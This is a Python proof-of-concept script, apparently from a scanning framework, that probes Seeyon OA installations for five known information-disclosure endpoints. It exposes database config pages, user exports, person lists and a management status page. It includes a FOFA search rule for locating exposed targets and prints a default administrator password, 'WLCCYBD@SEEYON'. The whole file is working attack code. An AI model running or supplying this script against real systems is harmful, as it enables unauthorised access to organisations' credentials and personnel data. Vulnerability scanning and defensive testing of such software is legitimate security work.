#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests

from Config.config_proxies import proxies
from Config.config_requests import headers

requests.packages.urllib3.disable_warnings()
# 脚本信息
######################################################
NAME='Seeyon_OA_Info_Leak'
AUTHOR="Joker"
REMARK='致远OA 敏感信息泄露'
FOFA_RULE='title="致远A8+协同管理软件.A6"'
######################################################

def poc(target):
    result = {}
    vuln_url1 = target + "/yyoa/createMysql.jsp"
    vuln_url2 = target + "/yyoa/ext/createMysql.jsp"
    vuln_url3 = target + "/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
    vuln_url4 = target + "/yyoa/assess/js/initDataAssess.jsp"
    vuln_url5 = target + "/seeyon/management/status.jsp"
    try:

        r1 = requests.get(url=vuln_url1, headers=headers, verify=False, timeout=5,proxies=proxies)
        r2 = requests.get(url=vuln_url2, headers=headers, verify=False, timeout=5,proxies=proxies)
        r3 = requests.get(url=vuln_url3, headers=headers, verify=False, timeout=5,proxies=proxies)
        r4 = requests.get(url=vuln_url4, headers=headers, verify=False, timeout=5,proxies=proxies)
        r5 = requests.get(url=vuln_url5, headers=headers, verify=False, timeout=5,proxies=proxies)
        if 'root' in r1.text and r1.status_code == 200:
            result['信息泄露path1'] = vuln_url1
        else:
            pass
        if 'root' in r2.text and r2.status_code == 200:
            result['信息泄露path2'] = vuln_url2
        else:
            pass
        if 'xls' in str(r3.headers).lower() and r3.status_code == 200:
            result['信息泄露ppath3'] = vuln_url3
        else:
            pass
        if 'personList' in r4.text and r4.status_code == 200:
            result['信息泄露path4'] = vuln_url4
        else:
            pass
        if 'Password' in r5.text and r5.status_code == 200:
            result['信息泄露path5'] = vuln_url5 +"    默认密码：WLCCYBD@SEEYON"
        else:
            pass

        if result:
            tmpdic={
                'target':target,
                'poc':NAME
            }
            result=dict(tmpdic,**result)
        return result
    except:
        pass


if __name__ == '__main__':
    poc("https://127.0.0.1")
